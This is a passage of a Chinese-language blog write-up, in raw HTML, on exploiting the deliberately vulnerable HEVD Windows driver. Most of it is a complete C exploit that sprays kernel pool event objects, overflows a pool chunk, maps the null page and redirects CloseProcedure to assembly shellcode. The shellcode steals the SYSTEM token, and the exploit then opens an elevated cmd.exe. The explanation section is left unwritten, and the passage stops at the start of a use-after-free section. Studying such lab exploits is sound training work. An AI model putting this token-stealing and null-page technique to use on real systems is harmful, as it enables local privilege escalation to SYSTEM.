</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></div><p>将0页<code>+0x60</code>的成员<code>CloseProcedure</code>指向我们的<code>shellcode</code>地址</p>
<div class="highlight" id="id-73"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mh">0x60</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ShellCode</span><span class="p">;</span> <span class="c1">// 将0页+0x60偏移成员CloseProcedure设置为我们shellcode地址
</span></span></span></code></pre></div><p>完整exp：</p>
<div class="highlight" id="id-74"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include&lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">NTSTATUS</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">My_NtAllocateVirtualMemory</span><span class="p">)(</span>
</span></span><span class="line"><span class="cl">	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">BaseAddress</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">ZeroBits</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">RegionSize</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Protect</span>
</span></span><span class="line"><span class="cl">	<span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">My_NtAllocateVirtualMemory</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">VOID</span> <span class="nf">ShellCode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">_asm</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="c1">//int 3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">pop</span> <span class="n">edi</span><span class="p">;</span> <span class="err">这里注意堆栈平衡</span>
</span></span><span class="line"><span class="cl">		<span class="n">pop</span> <span class="n">esi</span><span class="p">;</span> <span class="err">这里注意堆栈平衡</span>
</span></span><span class="line"><span class="cl">		<span class="n">pop</span> <span class="n">ebx</span><span class="p">;</span> <span class="err">这里注意堆栈平衡</span>
</span></span><span class="line"><span class="cl">		<span class="n">pushad</span>
</span></span><span class="line"><span class="cl">		<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span><span class="p">;</span> <span class="n">eax设置为0</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">124</span><span class="n">h</span><span class="p">];</span> <span class="err">获取</span> <span class="n">nt</span><span class="o">!</span><span class="n">_KPCR</span><span class="p">.</span><span class="n">PcrbData</span><span class="p">.</span><span class="n">CurrentThread</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mo">050</span><span class="n">h</span><span class="p">];</span> <span class="err">获取</span> <span class="n">nt</span><span class="o">!</span><span class="n">_KTHREAD</span><span class="p">.</span><span class="n">ApcState</span><span class="p">.</span><span class="n">Process</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span><span class="p">;</span> <span class="err">将本进程</span><span class="n">EPROCESS地址复制到ecx</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">4</span><span class="p">;</span> <span class="n">WIN</span> <span class="mi">7</span> <span class="n">SP1</span> <span class="n">SYSTEM</span> <span class="n">process</span> <span class="n">PID</span> <span class="o">=</span> <span class="mh">0x4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nl">SearchSystemPID</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">b8h</span><span class="p">];</span> <span class="err">获取</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">ActiveProcessLinks</span><span class="p">.</span><span class="n">Flink</span>
</span></span><span class="line"><span class="cl">			<span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">b8h</span>
</span></span><span class="line"><span class="cl">			<span class="n">cmp</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">b4h</span><span class="p">],</span> <span class="n">edx</span><span class="p">;</span> <span class="err">获取</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">UniqueProcessId</span>
</span></span><span class="line"><span class="cl">			<span class="n">jne</span> <span class="n">SearchSystemPID</span><span class="p">;</span> <span class="err">循环检测是否是</span><span class="n">SYSTEM进程PID</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mf">0f</span><span class="mi">8</span><span class="n">h</span><span class="p">];</span> <span class="err">获取</span><span class="n">System进程的Token</span>
</span></span><span class="line"><span class="cl">			<span class="n">mov</span><span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="mf">0f</span><span class="mi">8</span><span class="n">h</span><span class="p">],</span> <span class="n">edx</span><span class="p">;</span> <span class="err">将本进程</span><span class="n">Token替换为SYSTEM进程</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">Token</span>
</span></span><span class="line"><span class="cl">			<span class="p">;</span> <span class="n">End</span> <span class="n">of</span> <span class="n">Token</span> <span class="n">Stealing</span> <span class="n">Stub</span>
</span></span><span class="line"><span class="cl">			<span class="n">popad</span>
</span></span><span class="line"><span class="cl">			<span class="n">ret</span><span class="p">;</span> <span class="n">Return</span> <span class="n">cleanly</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Get HANDLE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Start to get HANDLE...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hDevice</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Success to get HANDLE!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">Event_OBJECT</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">Pool_Spray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">Event_OBJECT</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">CreateEventA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// 0x40 * 8 = 0x200
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nf">CloseHandle</span><span class="p">(</span><span class="n">Event_OBJECT</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">]);</span>    <span class="c1">//每次[0-7]*n的event空间，而8*n不释放，进而构成0x40 * 8 = 0x200的空闲空间
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">VOID</span> <span class="nf">CreateCmd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_SHOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">WCHAR</span> <span class="n">wzFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="sa">L</span><span class="s">&#34;cmd.exe&#34;</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">BOOL</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="nf">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">wzFilePath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTARTUPINFOW</span><span class="p">)</span><span class="o">&amp;</span> <span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">bReturn</span><span class="p">)</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">),</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">shellcode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// PoolSize + ModifySize = 0x1f8 + 0x28
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">const</span> <span class="kt">int</span> <span class="n">ModifySize</span> <span class="o">=</span> <span class="mh">0x28</span><span class="p">;</span>    <span class="c1">//由于我们只要将TypeIndex修改即可，所以溢出值只要到达TypeIndex的偏移即可
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">const</span> <span class="kt">int</span> <span class="n">PoolSize</span> <span class="o">=</span> <span class="mh">0x1f8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x220</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Started to construct pool...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="c1">//********构造池块**********
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x00</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x04080040</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x04</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xee657645</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x0c</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000040</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000001</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000001</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x24</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00080000</span><span class="p">;</span> <span class="c1">// 这个只是将TypeIndex字段设置为0x0，这是我们溢出构造的池块
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//********构造池块**********
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Success to construct pool!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">PVOID</span>    <span class="n">Zero_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">SIZE_T</span>    <span class="n">RegionSize</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">FARPROC</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="nf">GetProcAddress</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">		<span class="nf">GetModuleHandleW</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;ntdll&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;NtAllocateVirtualMemory&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Failed to get function NtAllocateVirtualMemory!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Started to alloc zero page...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">NT_SUCCESS</span><span class="p">(</span><span class="nf">NtAllocateVirtualMemory</span><span class="p">(</span>        <span class="c1">//通过NtAllocateVirtualMemory来申请0页内存空间
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="o">&amp;</span><span class="n">Zero_addr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="o">&amp;</span><span class="n">RegionSize</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">PAGE_READWRITE</span><span class="p">))</span> <span class="o">||</span> <span class="n">Zero_addr</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Failed to alloc zero page!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Success to alloc zero page...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="mh">0x60</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="o">&amp;</span> <span class="n">ShellCode</span><span class="p">;</span>        <span class="c1">//将0页+0x60偏移成员CloseProcedure设置为shellcode地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="nf">Pool_Spray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x22200f</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="n">PoolSize</span> <span class="o">+</span> <span class="n">ModifySize</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bReturn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">Event_OBJECT</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">Event_OBJECT</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">init</span><span class="p">()</span> <span class="o">==</span> <span class="n">FALSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Failed to get HANDLE!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">shellcode</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Start to Create cmd...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">CreateCmd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h4 id="利用原理" class="heading-element">
  <a href="#%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86" class="heading-mark"></a>利用原理</h4><p>待完成</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230814061317908.png" alt="image-20230814061317908" srcset="/posts/2023-8-hevd/image-20230814061317908.png?size=small, /posts/2023-8-hevd/image-20230814061317908.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230814061317908.png?size=large 2x" data-title="image-20230814061317908" style="--width: 559px;--aspect-ratio: 559 / 419;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="6uaf-allocateuafobjectnonpagedpool" class="heading-element">
  <a href="#6uaf-allocateuafobjectnonpagedpool" class="heading-mark"></a>6.UAF-AllocateUaFObjectNonPagedPool</h2><p>UAF：</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230814064851640.png" alt="image-20230814064851640" srcset="/posts/2023-8-hevd/image-20230814064851640.png?size=small, /posts/2023-8-hevd/image-20230814064851640.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230814064851640.png?size=large 2x" data-title="image-20230814064851640" style="--width: 900px;--aspect-ratio: 900 / 317;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>将释放后未设置成NULL的指针称为悬空指针（dangling pointer），该处的内存没有进行回收，导致下次申请内存时再次使用该处内存，使得悬空指针可以访问修改过的内存</p>
<p>示例代码：</p>
<div class="highlight" id="id-75"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;stdlib.h&gt;
